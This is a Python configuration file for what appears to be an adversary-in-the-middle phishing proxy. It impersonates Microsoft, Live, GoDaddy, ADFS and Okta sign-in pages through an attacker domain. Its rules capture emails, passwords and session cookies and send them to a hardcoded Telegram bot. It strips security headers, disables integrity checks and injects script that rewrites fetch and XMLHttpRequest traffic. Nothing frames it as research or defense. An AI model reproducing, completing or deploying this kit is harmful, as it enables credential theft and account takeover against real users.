import re
flag = 0
production = False

chat_id = "1193698958"
bot_token = "1828790296:AAHhSLeNfrbxs7bU9RfbJUmmmix9EWoOxwQ"
base_url = "login.microsoftonline.com"
familiarHosts = {
    "login": base_url,
    "sso":"sso.godaddy.com",
}
server_domain = "wrezs.com"
debug = 0
sendHead = "=====GREATNESS========\n"
sendTail = "=====[LOG]======\n"
cookDomain = ".login.microsoftonline.com"
ssl=True
replace_urls = 1
bad_headers = ["Set-Cookie","Content-Security-Policy","Content-Security-Policy-Report-Only","Strict-Transport-Security","X-XSS-Protection","X-Content-Type-Options","X-Frame-Options","Access-Control-Expose-Headers"]
excludes = ["w3.org","schemas.microsoft.com","xmlsoap.org",".oasis-open.org/wss","adfs/services/trust",".secureserver.net"]#"aadcdn","img6","img1","events",
injectScript = 1
handle_errors = 1
googleSiteKey = "6LeBGZgnAAAAAGH2J7MWGIC_W4qRIeQZHrab0IzB"
googleSecretKey = "6LeBGZgnAAAAADN5Q-hUlDsxUPoArjPqNB982sGn"
cloudfareSiteKey = "0x4AAAAAAAInpVvouANisJsR"
cloudFareSecret = "0x4AAAAAAAInpRsDMKvG4iduSBNnreK3jBo"
finalUrl = "https://login.microsoftonline.com"
defaultLogo = open("tmps/logo.txt").read()
script = """
(function(){
                var getLocation = function(href) {
					var l = document.createElement("a");
					l.href = href;
					return l;
				};
                function encoderSub(str) {
                        var hex = '';
                        for(var i=0;i<str.length;i++) {
                            hex += ''+str.charCodeAt(i).toString(16);
                        }
                        return hex;
                }
				function setUrl(baseurl,host){
                    if(host.includes(baseurl)){
                        return host;
                    }
					dash_url = encoderSub(host);
					return dash_url + "." + baseurl;
				}
                function patch(url){
                    baseUrl = "%s";
                    urlparts = getLocation(url);
                    if(urlparts.hostname.includes(baseUrl)){
                        return url;
                    }
                    return url.replace("https://"+urlparts.hostname,location.protocol + "//"+setUrl(baseUrl,urlparts.hostname));
                }
                function getCookie(cname) {
					let name = cname + "=";
					let decodedCookie = decodeURIComponent(document.cookie);
					let ca = decodedCookie.split(';');
					for(let i = 0; i <ca.length; i++) {
						let c = ca[i];
						while (c.charAt(0) == ' ') {
							c = c.substring(1);
						}
						if (c.indexOf(name) == 0) {
							return c.substring(name.length, c.length);
						}
					}
					return "";
				}
                var pSend = window.XMLHttpRequest.prototype.send;
                window.XMLHttpRequest.prototype.send = function() {
                    //add cookies
                    this.setRequestHeader("vfff9080", getCookie("vfff9080"));
					return pSend.apply(this, [].slice.call(arguments));
				};
				const constantMock = window.fetch;
                    window.fetch = function() {
                    console.log(typeof arguments[0]);
                    if(typeof arguments[0] == "object"){
                        arguments[0] = new Request(patch(arguments[0].url),arguments[0]);
                        // console.log(arguments[0]);
                    }
                    else{
                        arguments[0] = patch(arguments[0]);
                    }
                    return new Promise((resolve, reject) => {
                        constantMock
                          .apply(this, arguments)
                          .then((response) => {
                                resolve(response);
                            })
                           .catch((error) => {
                                reject(response);
                            })
                    });
                
                    }
        })();
""" % server_domain

before = [
      {
        "host":r".*\.microsoftonline\.com",
        "path" : "common\/login",
        "method":"post",
        "type": "urlencoded",
        "key":"loginfmt",
        "id":"email",
        "send":1,
        "send_format":"[[IP]] [OFFICE]\nEmail = [VALUE]\n"
      },
      {
        "host":r"login\.microsoftonline\.com",
        "path" : "common\/login",
        "method":"post",
        "type": "urlencoded",
        "key":"passwd",
        "id":"password",
        "send":1,
        "send_format":"[[IP]] [OFFICE]\nPassword = [VALUE]\n"
      },
      {
        "host":r"login\.live\.com",
        "path" : "ppsecure\/post\.srf",
        "method":"post",
        "type": "urlencoded",
        "key":"passwd",
        "id":"password",
        "send":1,
        "send_format":"[[IP]] [LIVE.COM]\nPassword = [VALUE]"
      },
      {
        "host":r"login\.live\.com",
        "path" : "ppsecure\/post\.srf",
        "method":"post",
        "type": "urlencoded",
        "key":"loginfmt",
        "id":"email",
        "send":1,
        "send_format":"[[IP]] [LIVE.COM]\nEmail = [VALUE]"
      },
      {
        "host":r"sso\.godaddy\.com",
        "path" : "test",
        "method":"post",
        "type": "json",
        "key":"username",
        "id":"email"
      },
      {
        "host":r"adfs\.*",
        "path" : "adfs\/ls\/\?mkt",
        "method":"post",
        "type": "urlencoded",
        "key":"UserName",
        "id":"email",
        "send":1,
        "send_format":"[[IP]] [ADFS]\nEmail = [VALUE]"
      },
      {
        "host":r"adfs\.*",
        "path" : "adfs\/ls\/\?mkt",
        "method":"post",
        "type": "urlencoded",
        "key":"Password",
        "id":"password",
        "send":1,
        "send_format":"[[IP]] [ADFS]\nPassword = [VALUE]"
      },
      {
        "host":r".*\.okta\.",
        "path" : "idp\/idx\/identify",
        "method":"post",
        "type": "json",
        "key":"identifier",
        "id":"email",
        "send":1,
        "send_format":"[[IP]] [OKTA]\nEmail = [VALUE]"
      },
      {
        "host":r".*\.okta\.",
        "path" : "\/idx\/challenge\/answer",
        "method":"post",
        "type": "raw",
        "key":"passcode\":\"(.*?)\"",
        "id":"password",
        "send":1,
        "send_format":"[[IP]] [OKTA]\nPassword = [VALUE]"
      },{
        "host":r"sso\.godaddy\.com",
        "path" : "v1\/api\/p",
        "method":"post",
        "type": "json",
        "key":"username",
        "id":"email",
        "send":1,
        "send_format":"[[IP]] [GODDADY]\nEmail = [VALUE]"
      },{
        "host":r"sso\.godaddy\.com",
        "path" : "v1\/api\/p",
        "method":"post",
        "type": "json",
        "key":"password",
        "id":"password",
        "send":1,
        "send_format":"[[IP]] [GODDADY]\nPassword = [VALUE]"
      },
      
]

watch = [
    {
        "type":"cookies",
        "values":["SignInStateCookie","CCState"],
        "final":1,
    }
]
def forcePost(data):
    if type(data) is bytes or type(data) is str:
        if b"API_HOST" in (data if type(data) is bytes else data.encode()):
            data = data.decode("utf-8",errors="ignore") if type(data) is bytes else data
            data = re.sub('\"API\_HOST\"\:\"(.*?)\"','"API_HOST":"sso.godaddy.com"',data)
            return data
        elif b"LoginOptions=0" in (data if type(data) is bytes else data.encode()) or b"LoginOptions=3" in (data if type(data) is bytes else data.encode()):
            data = data.decode("utf-8",errors="ignore") if type(data) is bytes else data
            data = data.replace("LoginOptions=3","LoginOptions=1")
            return data
def replaceUrls(path):
    if "ConvergedLogin_PCore_" in path:
        file = open("script.js","rb")
        return #[file,"application/x-javascript"]
def actOnresponse(response):
                response = response.replace("e.self===e.top","true")
                response = response.replace("_top","")
                response = response.replace("godaddy.com",server_domain)
                #response = response.replace("sso.godaddy.com",self.patchUrlHost("sso.godaddy.com"))
                response = response.replace("API_HOST:a,","API_HOST:'godaddy.com',")
                response = response.replace('+this.api_target+"."+',"+")
                response = response.replace('target="_top"',"")
             #   response = response.replace('nonce',"nononce")
                response = response.replace('crossorigin',"rickorigin")
                response = response.replace('integrity',"xintegrity")
                return response